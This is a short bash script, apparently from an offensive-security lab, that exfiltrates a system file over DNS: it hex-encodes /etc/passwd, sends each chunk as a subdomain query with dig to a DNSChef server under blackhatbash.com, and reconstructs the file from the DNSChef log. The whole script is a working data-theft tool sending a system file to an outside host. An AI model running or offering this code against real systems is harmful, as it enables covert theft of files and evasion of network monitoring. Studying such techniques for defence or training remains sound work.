#!/bin/bash

# dns_exfil.sh - Exfiltrate and reconstruct data using DNS queries and DNSChef logs

DOMAIN="blackhatbash.com"
DNSCHEF_SERVER="172.16.10.1"
TARGET_FILE="/etc/passwd"
LOG_FILE="dnschef.log"

exfiltrate() {
    echo "[*] Starting DNS exfiltration of $TARGET_FILE to $DOMAIN via $DNSCHEF_SERVER..."
    for i in $(xxd -p -c 30 "$TARGET_FILE"); do
        dig "${i}.${DOMAIN}" @"${DNSCHEF_SERVER}" > /dev/null
    done
    echo "[+] DNS exfiltration complete."
}

reconstruct() {
    if [[ ! -f "$LOG_FILE" ]]; then
        echo "[!] Log file $LOG_FILE not found."
        exit 1
    fi

    echo "[*] Reconstructing data from $LOG_FILE..."
    sed -n 's/.*for \(.*\) to .*/\1/p' "$LOG_FILE" | awk -F'.' '{print $1}' | xxd -r -p
    echo -e "\n[+] Reconstruction complete."
}

print_help() {
    echo "Usage: $0 [exfil|reconstruct]"
    echo
    echo "  exfil        Run DNS exfiltration of $TARGET_FILE"
    echo "  reconstruct  Reconstruct data from $LOG_FILE"
}

case "$1" in
    exfil)
        exfiltrate
        ;;
    reconstruct)
        reconstruct
        ;;
    *)
        print_help
        ;;
esac
